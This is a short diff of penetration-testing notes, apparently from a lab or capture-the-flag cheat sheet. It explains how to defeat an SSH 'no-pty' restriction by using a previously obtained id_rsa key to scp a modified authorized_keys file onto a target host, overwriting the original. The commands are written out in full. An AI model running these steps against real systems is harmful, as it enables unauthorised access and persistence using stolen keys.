@@ -30,9 +30,13 @@ ssh user@$IP "/bin/sh"```
 - If you can read the 'authorized_keys' file, you may see there is a 'no-pty' option
 - We may be able to replace this file if we have an SSH key for the target user using <b>scp</b> with a public key. 
 Copy the authorised key, remove the 'no-pty' option  and then place it back on the target, overwriting the blocking file
+
 ``` scp -i id_rsa authorized_keys dude@192.168.150.150:.ssh/authorized_keys ```
+
 > This uses an id_rsa key we have previously obtained for a user called 'dude' and replaces authorized_keys with our modified file
+
 Note: If you are not allowed to produce output on the target, use the -O flag
+
 ``` scp -O  -i id_rsa authorized_keys dude@192.168.150.150:.ssh/authorized_keys ```
 
 
